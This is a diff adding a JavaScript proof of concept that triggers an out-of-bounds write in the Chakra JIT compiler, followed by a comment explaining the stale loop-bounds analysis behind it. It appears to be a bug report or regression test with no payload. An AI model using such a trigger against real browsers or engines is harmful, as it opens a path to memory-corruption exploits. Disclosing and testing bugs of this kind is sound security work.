@@ -1,0 +1,28 @@
+// Here's the PoC demonstrating OOB write.
+
+function opt(arr, start, end) {
+    for (let i = start; i < end; i++) {
+        if (i === 10) {
+            i += 0;  // <<-- (a)
+        }
+        arr[i] = 2.3023e-320;
+    }
+}
+
+function main() {
+    let arr = new Array(100);
+    arr.fill(1.1);
+
+    for (let i = 0; i < 1000; i++)
+        opt(arr, 0, 3);
+
+    opt(arr, 0, 100000);
+}
+
+main();
+
+/*
+What happens here is as follows:
+In the loop prepass analysis, (a) is a valid add operation. It's a relative operation to "i", so Chakra thinks it's a valid loop. The variable "i" now becomes an induction variable, and a LoopCount object is created. When the LoopCount object is created, the ValueInfo of "i" is IntBounded which contains relative bounds information. 
+In the actual optimization phase, (a) gets optimized and becomes a load operation which directly loads 10 to "i". It's no more relative operation, therefore the ValueInfo of "i" is not to be IntBounded. But the LoopCount object has already been created with the previous information. This leads Chakra to fail computing bounds which may result in OOB read/write.
+*/
